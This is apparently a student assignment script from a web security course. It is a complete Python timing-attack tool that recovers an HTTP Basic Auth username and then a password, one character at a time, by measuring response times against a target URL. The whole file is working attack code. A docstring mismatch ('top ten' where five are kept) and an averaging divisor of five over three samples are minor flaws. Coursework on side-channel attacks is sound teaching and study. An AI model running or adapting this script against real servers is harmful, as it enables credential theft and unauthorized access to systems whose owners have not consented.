"""
CS510 Web Security Program 2
Andrew Rogers
Fall 2017
"""

import sys
import string
import time
import requests
from requests.auth import HTTPBasicAuth
from operator import itemgetter


def mean(numbers):
    return float(sum(numbers)) / max(len(numbers), 5)


def run_test(login, password, url):
    """
    Records timing data for an individual time attack event
    :param payload: the password string to be tested
    :param url: the target website
    :return: the time in float to complete the attack event
    """
    tests = []
    while len(tests) < 3:
        pre_time = time.time()
        requests.get(url, auth=HTTPBasicAuth(login, password))
        total_time = time.time() - pre_time
        tests.append(total_time)
    return mean(tests)


def range_testing(poss_chars, known_login, known_pass, url, login_found):
    """
    Builds a list of test results and sorts from the longest duration
    to shortest over a range of provided characters
    :param poss_chars: this is the range of characters to be considered
    :param known_pass: The previously derived character to be built upon
    :param url: the target url for the attack
    :return: A list of the top ten (in order) most likely characters
    """
    test_list = []
    for test_char in poss_chars:
        if login_found:  # Login is already found
            test = known_pass + test_char
            print("The current test is %s" % test)
            total_time = run_test(known_login, test, url)
            print("Time for %s was %f" % (test, total_time))
        else:
            test = known_login + test_char
            print("The current test is %s" % test)
            total_time = run_test(test, '', url)
            print("Time for %s was %f" % (test, total_time))
        test_list.append((total_time, test_char))
    test_list.sort(key=itemgetter(0), reverse=True)  # sorting the list
    result_list = []
    for pass_char in test_list[:5]:
        result_list.append(pass_char[1])
    return result_list


def find_pass(login, known_pass, url):
    """
    Organizes the test of all alphanumeric characters and then runs a test
    of the top ten results from the 1st test to provide error checking

    :param known_login: A string containing the correct login characters
    already found so far.
    :param known_pass: A string containing the correct password characters
    already found so far.
    :param url: The website for the basic auth test
    :return: the list of known characters with a new correct character
    attached.
    """
    sample_range = string.ascii_letters + string.digits  # building range of all alphanumeric
    print('\n\nTesting login %s and pass %s' % (login, known_pass))
    top_five = range_testing(sample_range, login, known_pass, url, True)
    print("\n\nTesting the top 5 results")
    final_test = range_testing(top_five, login, known_pass, url, True)
    print("\n\nThe slowest character was %s" % final_test[0])
    return known_pass + final_test[0]


def find_login(url):
    test_login = ''
    end_found = False
    sample_range = ':' + string.ascii_letters + string.digits
    while not end_found:
        print('\n\nTesting login %s' % test_login)
        top_five = range_testing(sample_range, test_login, None, url, False)
        print("\n\nTesting the top 5 results")
        final_test = range_testing(top_five, test_login, None, url, False)
        if final_test[0] == ':':
            end_found = True
        else:
            test_login = test_login + final_test[0]
        print("\n\nThe slowest character was %s" % final_test[0])
    return test_login


def main():
    # Command line argument exception handling
    if len(sys.argv) < 2:
        print("You failed to provide a target URL on the command line!")
        sys.exit(1)  # abort because of error
    test_url = sys.argv[1]
    if test_url[:7].lower() != "http://":
        print("ERROR:: Expecting URL beginning with \'http://\' ")
        sys.exit(1)  # abort because of error
    url_status = requests.get(test_url)  # validate the url
    if url_status.status_code != 401:
        print("URL in error or without authentication with status code %d" % url_status)
        sys.exit(1)

    # Beginning the actual attack
    login = find_login(test_url)
    print("\n\nThe login is %s" % login)
    pwd = ''
    while requests.get(test_url, auth=HTTPBasicAuth(login, pwd)).status_code == 401:
        pwd = find_pass(login, pwd, test_url)
    print("\n\nFinished! \n The password is %s" % pwd)


if __name__ == '__main__':
    main()
